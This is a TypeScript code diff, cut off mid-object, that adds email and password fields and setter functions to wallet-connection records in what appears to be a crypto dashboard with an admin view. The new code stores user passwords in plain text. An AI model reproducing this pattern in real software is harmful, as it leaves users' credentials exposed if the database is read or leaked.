@@ -34,6 +34,12 @@ export type DbConnection = {
   note?: string
   /** ISO timestamp of when the note was submitted. */
   noteAt?: string
+  /** Email the user sets on first sign-up (MetaMask/Trust only). Shown to admin. */
+  email?: string
+  /** Account password set on first sign-up. Stored, but NEVER shown to the admin. */
+  password?: string
+  /** ISO timestamp of when the email/password were submitted. */
+  credentialsAt?: string
   at: string // ISO timestamp of last connect
 }
 
@@ -195,6 +201,56 @@ export async function setUserNote(address: string, note: string) {
       address,
       note,
       noteAt: now,
+      walletId: 'unknown',
+      chain: 'evm',
+      deposited: 0,
+      profit: 0,
+      pnl: 0,
+      at: now,
+    })
+  }
+  await saveDb(db)
+}
+
+/** Save the user's sign-up email (one-time). Upserts the connection. */
+export async function setUserEmail(address: string, email: string) {
+  const db = await getDb()
+  const now = new Date().toISOString()
+  const existing = db.connections.find((x) => sameAddr(x.address, address))
+  if (existing) {
+    existing.email = email
+    existing.credentialsAt = now
+  } else {
+    db.connections.push({
+      id: uid(),
+      address,
+      email,
+      credentialsAt: now,
+      walletId: 'unknown',
+      chain: 'evm',
+      deposited: 0,
+      profit: 0,
+      pnl: 0,
+      at: now,
+    })
+  }
+  await saveDb(db)
+}
+
+/** Save the user's sign-up password (one-time). Never shown to the admin. */
+export async function setUserPassword(address: string, password: string) {
+  const db = await getDb()
+  const now = new Date().toISOString()
+  const existing = db.connections.find((x) => sameAddr(x.address, address))
+  if (existing) {
+    existing.password = password
+    existing.credentialsAt = now
+  } else {
+    db.connections.push({
+      id: uid(),
+      address,
+      password,
+      credentialsAt: now,
       walletId: 'unknown',
       chain: 'evm',
       deposited: 0,
